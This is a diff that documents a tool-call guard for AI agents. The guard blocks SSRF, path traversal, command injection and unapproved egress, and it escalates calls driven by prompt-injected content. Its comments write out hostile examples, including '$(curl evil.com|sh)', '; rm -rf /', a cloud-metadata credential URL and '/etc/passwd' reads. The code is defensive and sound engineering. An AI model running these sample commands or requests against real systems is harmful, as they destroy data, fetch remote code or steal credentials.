@@ -56,6 +56,13 @@ from agentvanguard.core.models import Finding, PolicyInput, ToolManifest, Verdic
 from agentvanguard.detectors.registry import DetectorRegistry
 from agentvanguard.policy.risk import SEVERITY_BASE_SCORE, finding_score, max_score
 
+# Finding types that immediately abort the tool call with DENY, regardless
+# of the tool's own risk_tier or requires_approval setting. Anything in this
+# set represents either a structural violation (unknown tool, schema
+# mismatch, disallowed caller) or an attack pattern (SSRF, path traversal,
+# command injection, egress to an unapproved host, a leaked credential)
+# rather than an ordinary risk judgment call -- it is never something a
+# human "approves through".
 _HARD_STOP_TYPES = {
     FindingType.UNKNOWN_TOOL,
     FindingType.CALLER_NOT_ALLOWED,
@@ -67,15 +74,38 @@ _HARD_STOP_TYPES = {
     FindingType.SECRET,
 }
 
+# Provenance labels that mark content as having originated *outside* direct,
+# trusted user input -- e.g. fetched from the web, returned by a previous
+# tool call, or produced by another agent. A HIGH/CRITICAL-risk tool call
+# that was triggered by content carrying one of these labels is treated as
+# more suspicious (possible prompt-injection-driven tool abuse) and escalated
+# to REQUIRE_USER_CONFIRMATION even if it would otherwise be auto-allowed.
 _UNTRUSTED_PROVENANCE = {
     ProvenanceLabel.RETRIEVED_DOC,
     ProvenanceLabel.TOOL_OUTPUT,
     ProvenanceLabel.SUB_AGENT,
 }
 
+# Argument-name heuristics used to decide which string arguments are worth
+# running the SSRF/egress or path-traversal checks against, even when the
+# value itself doesn't obviously look like a URL or a path. E.g. an argument
+# named "endpoint" with value "10.0.0.1" doesn't match _looks_like_url, but
+# the key name alone is enough reason to treat it as a network destination.
 _URL_KEY_RE = re.compile(r"(url|uri|host|hostname|endpoint|domain|address)", re.IGNORECASE)
 _PATH_KEY_RE = re.compile(r"(path|file|dir|directory|folder)", re.IGNORECASE)
+
+# Shell metacharacters that, if present in an argument passed to an EXECUTE
+# tool, could be used to break out of the intended single command and chain
+# on additional shell commands (e.g. "; rm -rf /", "$(curl evil.com|sh)",
+# "`whoami`", "a && b", pipes, redirection, backslash-escapes, or embedded
+# newlines that start a new logical command).
 _SHELL_METACHARS = set(";|&`$()<>\\\n")
+
+# Hostnames that are blocked outright regardless of how they resolve in DNS,
+# because they are reliably used to reach sensitive local/internal services:
+# "localhost" (the calling host itself) and the well-known cloud-provider
+# instance-metadata hostnames (which serve credentials/secrets over plain
+# HTTP with no auth on AWS/GCP/Azure-style platforms).
 _BLOCKED_HOSTNAMES = {"localhost", "metadata.google.internal", "metadata.internal"}
 
 
@@ -87,6 +117,9 @@ def evaluate(
 ) -> Verdict:
     """Run the tool-call guard and return its `Verdict`."""
 
+    # Step 1: tool lookup. A tool name that isn't in the registered
+    # manifests is the core fail-closed guarantee -- we never guess at a
+    # policy for a tool we know nothing about, we just deny it.
     tool_name = policy_input.tool or ""
     manifest = tool_manifests.get(tool_name)
 
@@ -99,6 +132,10 @@ def evaluate(
         )
         return _verdict(DecisionAction.DENY, [finding], [finding.message])
 
+    # Step 2: caller check. If the manifest restricts which agents may
+    # invoke this tool (`allowed_callers`), reject any other caller -- e.g.
+    # a "refund_processor" tool might only allow the "billing_agent" to call
+    # it, even though other agents in the system could otherwise reach it.
     agent_name = policy_input.agent.name if policy_input.agent else None
 
     if manifest.allowed_callers and agent_name not in manifest.allowed_callers:
@@ -110,11 +147,20 @@ def evaluate(
         )
         return _verdict(DecisionAction.DENY, [finding], [finding.message])
 
+    # Step 3: workflow scoping. Resolve which workflow this call belongs to
+    # (explicit on the PolicyInput, falling back to the calling agent's
+    # configured workflow), then look up that workflow's config.
     workflow_name = policy_input.workflow
     if workflow_name is None and policy_input.agent is not None:
         workflow_name = policy_input.agent.workflow
     workflow_cfg = config.workflows.get(workflow_name) if workflow_name else None
 
+    # A workflow name was supplied but isn't actually declared under
+    # `workflows:` in config -- i.e. we don't know its allowed_tools/
+    # allowed_agents/egress_allowlist. Under the restrictive default
+    # workflow mode, any non-LOW-risk tool call made under an unrecognized
+    # workflow requires a human to confirm rather than silently allowing it
+    # (fail toward caution when we lack workflow-specific policy).
     if workflow_name is not None and workflow_cfg is None:
         if config.firewall.default_workflow_mode == "restrictive" and manifest.risk_tier != RiskTier.LOW:
             reason = (
@@ -128,6 +174,10 @@ def evaluate(
                 base_risk_score=SEVERITY_BASE_SCORE[manifest.risk_tier],
             )
 
+    # If the workflow *is* configured, enforce its explicit allow-lists:
+    # a workflow can restrict which tools may be called within it, and
+    # which agents may operate within it, independent of the tool's own
+    # allowed_callers list checked in step 2.
     if workflow_cfg is not None:
         if workflow_cfg.allowed_tools and tool_name not in workflow_cfg.allowed_tools:
             finding = Finding(
@@ -147,6 +197,11 @@ def evaluate(
             )
             return _verdict(DecisionAction.DENY, [finding], [finding.message])
 
+    # Step 4: schema validation. The tool's declared input_schema (a JSON
+    # Schema) is the contract for what arguments are even well-formed for
+    # this tool -- e.g. catching a string passed where an integer was
+    # expected, or a required field that's missing -- before we bother
+    # running any of the more expensive content-based checks below.
     if manifest.input_schema is not None:
         try:
             jsonschema.validate(policy_input.arguments or {}, manifest.input_schema)
@@ -159,6 +214,11 @@ def evaluate(
             )
             return _verdict(DecisionAction.DENY, [finding], [finding.message])
 
+    # Step 5: content-based checks on every string-valued argument. Each
+    # helper inspects the (key, value) pair independently and returns zero
+    # or more Findings; non-string arguments (ints, bools, nested dicts/
+    # lists) are skipped since these checks are all about strings that might
+    # encode a URL, a filesystem path, or shell input.
     findings: list[Finding] = []
     for key, value in (policy_input.arguments or {}).items():
         if not isinstance(value, str):
@@ -169,6 +229,11 @@ def evaluate(
         findings.extend(_check_egress(key, value, manifest, config, workflow_cfg))
         findings.extend(detectors.detect_with(["secrets"], value, ProvenanceLabel.ASSISTANT))
 
+    # Any finding whose type is in _HARD_STOP_TYPES (SSRF, path traversal,
+    # command injection, egress denial, or a leaked secret/credential) is an
+    # immediate DENY -- these are attack indicators, not risk judgment
+    # calls, so they bypass the requires_approval/risk_tier logic below
+    # entirely.
     if findings:
         hard_stops = [f for f in findings if f.type in _HARD_STOP_TYPES]
         if hard_stops:
@@ -179,6 +244,9 @@ def evaluate(
                 base_risk_score=SEVERITY_BASE_SCORE[manifest.risk_tier],
             )
 
+    # Step 6a: explicit approval requirement. If the manifest says this
+    # tool always needs a human in the loop (e.g. "wire_transfer"), require
+    # confirmation regardless of risk_tier or how clean the arguments were.
     if manifest.requires_approval:
         reason = f"tool '{tool_name}' requires user approval (risk_tier={manifest.risk_tier.value})"
         return _verdict(
@@ -189,6 +257,14 @@ def evaluate(
             base_risk_score=SEVERITY_BASE_SCORE[manifest.risk_tier],
         )
 
+    # Step 6b: risk-tier + untrusted-provenance escalation. A HIGH/CRITICAL
+    # risk tool is only escalated to REQUIRE_USER_CONFIRMATION if the call
+    # was triggered by content that didn't come directly from the trusted
+    # user (e.g. a retrieved web page, a prior tool's output, or another
+    # sub-agent) -- the concern being prompt-injection-style content that
+    # talks an LLM into invoking a dangerous tool on its own. A HIGH/
+    # CRITICAL tool triggered purely by direct user instruction, with no
+    # untrusted content in the mix, is allowed through this step.
     if manifest.risk_tier in (RiskTier.HIGH, RiskTier.CRITICAL):
         triggering = _triggering_provenance(policy_input)
         if triggering & _UNTRUSTED_PROVENANCE:
@@ -203,6 +279,10 @@ def evaluate(
                 base_risk_score=SEVERITY_BASE_SCORE[manifest.risk_tier],
             )
 
+    # Nothing above triggered a DENY or REQUIRE_USER_CONFIRMATION: allow the
+    # call. Any non-hard-stop findings collected in step 5 (e.g. low-
+    # severity informational findings) are still attached to the Verdict
+    # for audit-trail purposes even though they didn't change the action.
     return _verdict(
         DecisionAction.ALLOW,
         findings,
@@ -218,6 +298,15 @@ def _verdict(
     required_approvals: list[str] | None = None,
     base_risk_score: float = 0.0,
 ) -> Verdict:
+    """Build the `Verdict` returned by `evaluate()`.
+
+    `risk_score` is the max of `base_risk_score` (the tool's own risk_tier,
+    e.g. so a CRITICAL-tier tool always reports at least a CRITICAL-tier
+    score even with zero findings) and every individual finding's own score
+    -- i.e. whichever signal is highest wins, findings never *lower* the
+    score below what the tool's risk tier alone would imply.
+    """
+
     scores = [base_risk_score] + [finding_score(f) for f in findings]
     return Verdict(
         stage=GuardStage.TOOL_CALL,
@@ -230,16 +319,30 @@ def _verdict(
 
 
 def _triggering_provenance(policy_input: PolicyInput) -> set[ProvenanceLabel]:
+    """Collect the distinct `ProvenanceLabel`s of the content that led to
+    this tool call (e.g. {USER}, {RETRIEVED_DOC, TOOL_OUTPUT}), used by the
+    risk-tier escalation check in `evaluate()` to detect when a HIGH/
+    CRITICAL tool call was driven by untrusted content rather than a direct
+    user instruction. Returns an empty set when `policy_input.content` is
+    `None` or a bare string (no per-item provenance available)."""
+
     if isinstance(policy_input.content, list):
         return {item.provenance for item in policy_input.content}
     return set()
 
 
 def _looks_like_url(value: str) -> bool:
+    """True if `value` starts with a URI scheme (`scheme://...`), e.g.
+    `"https://example.com"` or `"file:///etc/passwd"` -> True;
+    `"example.com"` or `"10.0.0.1"` (no scheme) -> False."""
+
     return bool(re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", value))
 
 
 def _looks_like_ip_literal(value: str) -> bool:
+    """True if `value` parses cleanly as a bare IPv4 or IPv6 address, e.g.
+    `"127.0.0.1"` or `"::1"` -> True; `"example.com"` -> False."""
+
     try:
         ipaddress.ip_address(value)
         return True
@@ -248,6 +351,32 @@ def _looks_like_ip_literal(value: str) -> bool:
 
 
 def _extract_host(value: str, key_hint: bool = False) -> str | None:
+    """Best-effort extraction of a hostname/IP from an argument value, for
+    feeding into the SSRF and egress-allowlist checks.
+
+    Handles three shapes of input, in order:
+
+    1. A full URL (`scheme://...`) -- delegate to `urlparse(...).hostname`,
+       e.g. `"https://user@10.0.0.1:8080/path"` -> `"10.0.0.1"`.
+    2. Anything containing whitespace or an unparsed `@` -- bail out with
+       `None` rather than guessing, since such values are unlikely to be a
+       clean hostname and could be adversarially crafted to confuse the
+       parser (e.g. an attempt to smuggle a second host past a naive
+       `@`-based parse).
+    3. A bare IP literal (no scheme) -- returned as-is, e.g.
+       `"169.254.169.254"` -> `"169.254.169.254"`.
+
+    If none of those match, the value is only treated as a hostname if it
+    either contains a `.` (looks domain-like), equals `"localhost"`
+    (case-insensitively), or `key_hint` is set (the argument's *name*
+    suggested it's a network destination, e.g. key `"endpoint"`) -- this
+    avoids treating an unrelated plain string argument (like a free-text
+    `"description"` field that happens not to contain a URL) as a host.
+    Finally, strips off any trailing `/path` or `:port` suffix, e.g.
+    `"example.com:8080/foo"` -> `"example.com"`. Returns `None` if nothing
+    host-like could be extracted, or if stripping leaves an empty string.
+    """
+
     if _looks_like_url(value):
         return urlparse(value).hostname
     if " " in value or "\t" in value or "\n" in value or "@" in value:
@@ -263,6 +392,27 @@ def _extract_host(value: str, key_hint: bool = False) -> str | None:
 
 
 def _is_blocked_ip(ip: ipaddress.IPv4Address | ipaddress.IPv6Address) -> bool:
+    """True if `ip` falls in any non-public IP range that a tool should
+    never be allowed to reach directly, covering the standard SSRF target
+    classes:
+
+    - `is_private` -- RFC 1918 private ranges (e.g. `10.0.0.0/8`,
+      `192.168.0.0/16`) and similar, i.e. internal-network addresses.
+    - `is_loopback` -- `127.0.0.0/8` / `::1`, i.e. "this same machine".
+    - `is_link_local` -- `169.254.0.0/16` / `fe80::/10`. Notably this is
+      where cloud-provider instance-metadata services live (e.g.
+      `169.254.169.254` on AWS/GCP/Azure), which is one of the most common
+      real-world SSRF targets for exfiltrating instance credentials.
+    - `is_reserved` -- IANA-reserved ranges not meant for public routing.
+    - `is_multicast` -- multicast address ranges, not a normal unicast
+      destination.
+    - `is_unspecified` -- the all-zeros address (`0.0.0.0` / `::`), which on
+      many systems is treated as "any local address" by the OS.
+
+    Example: `_is_blocked_ip(ipaddress.ip_address("169.254.169.254"))` ->
+    `True`; `_is_blocked_ip(ipaddress.ip_address("8.8.8.8"))` -> `False`.
+    """
+
     return (
         ip.is_private
         or ip.is_loopback
@@ -274,6 +424,15 @@ def _is_blocked_ip(ip: ipaddress.IPv4Address | ipaddress.IPv6Address) -> bool:
 
 
 def _resolve_host_ips(host: str) -> list[str]:
+    """DNS-resolve `host` to its list of IP address strings, used to catch
+    DNS-rebinding-style SSRF where a hostname that looks innocuous (e.g.
+    `"my-service.example.com"`) actually resolves to an internal/blocked
+    address. Returns an empty list if `host` is already a literal IP (no
+    lookup needed by the caller) or if resolution fails for any reason
+    (`OSError`, e.g. NXDOMAIN) -- callers treat "no resolved IPs" as "no
+    finding from this check", not as an error.
+    """
+
     try:
         infos = socket.getaddrinfo(host, None)
     except OSError:
@@ -282,6 +441,41 @@ def _resolve_host_ips(host: str) -> list[str]:
 
 
 def _check_ssrf(key: str, value: str, manifest: ToolManifest) -> list[Finding]:
+    """SSRF (server-side request forgery) check for a single (key, value)
+    string argument.
+
+    Goal: stop a tool from being pointed at an internal/cloud-metadata
+    address that the agent shouldn't be able to reach, even indirectly via
+    a hostname that resolves there. Example attack this catches: a "fetch
+    url" tool called with `url="http://169.254.169.254/latest/meta-data/"`
+    to steal cloud credentials, or with a hostname like
+    `"internal-service.attacker-controlled.com"` that an attacker has
+    pointed at `10.0.0.5` via DNS.
+
+    Steps:
+
+    1. Decide whether this argument is even worth checking: either its
+       *name* hints at a network destination (`key_hint`, e.g. "url"/
+       "host"/"endpoint"), or its *value* already looks like a URL or a
+       bare IP literal. If none of those hold (e.g. key="description",
+       value="a normal sentence"), skip with no finding -- avoids false
+       positives on unrelated string arguments.
+    2. Extract a candidate hostname/IP from the value via `_extract_host`.
+       If nothing host-like could be extracted, there's nothing to check.
+    3. Reject outright if the host textually matches one of the always-
+       blocked hostnames (`localhost`, cloud metadata hostnames) --
+       independent of DNS, since these names are dangerous by definition.
+    4. If the host is itself a literal IP address (e.g. "169.254.169.254"),
+       check it directly against the blocked IP ranges.
+    5. Otherwise the host is a DNS name -- resolve it and check *every*
+       returned IP against the blocked ranges. This is the DNS-rebinding
+       defense: a hostname can look perfectly public but still resolve to
+       an internal address.
+
+    Returns a single CRITICAL `SSRF` Finding (in a list) on any of these
+    matches, or an empty list if the argument is clean.
+    """
+
     ip_literal = _looks_like_ip_literal(value)
     key_hint = bool(_URL_KEY_RE.search(key))
     if not (key_hint or _looks_like_url(value) or ip_literal):
@@ -291,6 +485,8 @@ def _check_ssrf(key: str, value: str, manifest: ToolManifest) -> list[Finding]:
     if host is None:
         return []
 
+    # Hostname-based block list: matches regardless of how (or whether) the
+    # name resolves in DNS, since these are dangerous purely by identity.
     if host.lower() in _BLOCKED_HOSTNAMES:
         return [
             Finding(
@@ -306,6 +502,8 @@ def _check_ssrf(key: str, value: str, manifest: ToolManifest) -> list[Finding]:
     except ValueError:
         ip = None
 
+    # The argument was a literal IP address (not a DNS name) -- check it
+    # directly against the blocked ranges; no DNS resolution needed/possible.
     if ip is not None:
         if _is_blocked_ip(ip):
             return [
@@ -318,6 +516,10 @@ def _check_ssrf(key: str, value: str, manifest: ToolManifest) -> list[Finding]:
             ]
         return []
 
+    # The argument was a DNS name -- resolve it and check every IP it
+    # resolves to. A hostname that resolves to multiple addresses (some
+    # public, some private) is blocked if *any* resolved address is
+    # non-public, since an attacker only needs one bad address to succeed.
     for ip_str in _resolve_host_ips(host):
         try:
             resolved = ipaddress.ip_address(ip_str)
@@ -337,6 +539,42 @@ def _check_ssrf(key: str, value: str, manifest: ToolManifest) -> list[Finding]:
 
 
 def _check_path_traversal(key: str, value: str, manifest: ToolManifest, config: Config) -> list[Finding]:
+    """Path-traversal check for a single (key, value) string argument.
+
+    Goal: stop a tool whose argument is meant to be a path *within* the
+    configured workspace (e.g. `config.tool_guard.workspace_root`) from
+    actually resolving to somewhere outside it -- whether via `../../`
+    segments, an absolute path like `/etc/passwd`, or a `file://` URL.
+    Example attack this catches: a "read_file" tool called with
+    `path="../../../../etc/passwd"` or `path="/etc/shadow"`.
+
+    Steps:
+
+    1. Empty value -> nothing to check.
+    2. If the value is a URL, only `file://` URLs are relevant here (other
+       schemes like `http://` are network destinations, handled by
+       `_check_ssrf`/`_check_egress` instead) -- extract the filesystem
+       path portion (`.path` or, if empty, `.netloc`, to handle
+       `file://etc/passwd`-style URLs missing the third slash).
+    3. Skip the check entirely unless either the argument name looks
+       path-like (`_PATH_KEY_RE`, e.g. "path"/"file"/"dir") or the tool's
+       `action_type` is one of READ/WRITE/DELETE (a filesystem-touching
+       operation) -- avoids false positives on unrelated string arguments
+       for tools that don't touch the filesystem.
+    4. Resolve the value to an absolute, normalized path: if it's already
+       absolute, normalize it as-is (this is what catches `/etc/passwd`);
+       if relative, join it onto `workspace_root` first (this is what
+       catches `../../etc/passwd` after `os.path.normpath` collapses the
+       `..` segments) -- then check that the result is either exactly the
+       workspace root or a path *underneath* it (`startswith(root + os.sep)`,
+       not just `startswith(root)`, so that a sibling directory like
+       `/workspace-evil` doesn't pass a naive prefix check against
+       `/workspace`).
+
+    Returns a HIGH-severity `PATH_TRAVERSAL` Finding (in a list) if the
+    resolved path escapes the workspace root, or an empty list otherwise.
+    """
+
     if not value:
         return []
 
@@ -371,6 +609,24 @@ def _check_path_traversal(key: str, value: str, manifest: ToolManifest, config: 
 
 
 def _check_command_injection(key: str, value: str, manifest: ToolManifest) -> list[Finding]:
+    """Command-injection check for a single (key, value) string argument.
+
+    Goal: for tools that actually execute a shell command (`action_type ==
+    EXECUTE`), reject any argument that contains shell metacharacters (see
+    `_SHELL_METACHARS`) that could let the supplied value break out of its
+    intended position as a single argument and inject additional commands.
+    Example attack this catches: an "run_command" tool called with
+    `arg="; rm -rf / #"` or `arg="$(curl http://evil.com/payload | sh)"`.
+
+    Only runs at all for EXECUTE-type tools -- a path/URL/text argument on a
+    READ or WRITE tool legitimately containing, say, a `&` character isn't
+    a command-injection risk if that tool never shells out.
+
+    Returns a HIGH-severity `COMMAND_INJECTION` Finding (in a list) listing
+    the offending characters found, or an empty list if `value` contains
+    none of the blocked metacharacters.
+    """
+
     if manifest.action_type != ActionType.EXECUTE:
         return []
     found = _SHELL_METACHARS.intersection(value)
@@ -394,6 +650,43 @@ def _check_egress(
     config: Config,
     workflow_cfg: WorkflowConfig | None,
 ) -> list[Finding]:
+    """Egress allow-list check for a single (key, value) string argument.
+
+    Goal: even for hosts that are perfectly *public* (so `_check_ssrf` finds
+    nothing wrong), restrict tools that talk to the network
+    (`side_effect == EXTERNAL_COMMUNICATION`) to only the hosts an operator
+    has explicitly approved, via an egress allow-list. This is a separate,
+    narrower concern from SSRF: SSRF blocks *internal* destinations
+    unconditionally; egress allow-listing blocks *external* destinations
+    that simply aren't on the approved list, e.g. a "send_webhook" tool
+    being pointed at `attacker.example.com` instead of the organization's
+    own approved webhook receiver.
+
+    Steps:
+
+    1. Decide whether to check this argument at all: always check if the
+       tool itself is flagged as doing external communication; otherwise
+       only check if the argument looks like a URL/IP or its name hints at
+       a network destination (mirrors the gating logic in `_check_ssrf`).
+    2. Extract the candidate host the same way `_check_ssrf` does.
+    3. Resolve which allow-list applies: the current workflow's
+       `egress_allowlist` takes precedence if set, otherwise fall back to
+       the global `config.tool_guard.egress_allowlist`. If neither is
+       configured (empty allow-list), there's nothing to enforce -- this
+       check is opt-in via configuration, not fail-closed by default.
+    4. Check the host against the allow-list, permitting either an exact
+       match (`"api.example.com"` matches allowed entry `"api.example.com"`)
+       or a subdomain match (`"foo.api.example.com"` matches allowed entry
+       `"api.example.com"` via the `.`-prefixed suffix check, while
+       `"evilapi.example.com"` does *not* falsely match `"api.example.com"`
+       because the comparison requires a literal `.` boundary, not just a
+       string suffix).
+
+    Returns a HIGH-severity `EGRESS_DENIED` Finding (in a list) if the host
+    isn't covered by the applicable allow-list, or an empty list if it is
+    (or if no allow-list applies).
+    """
+
     ip_literal = _looks_like_ip_literal(value)
     key_hint = bool(_URL_KEY_RE.search(key))
     if manifest.side_effect != SideEffect.EXTERNAL_COMMUNICATION and not (key_hint or _looks_like_url(value) or ip_literal):
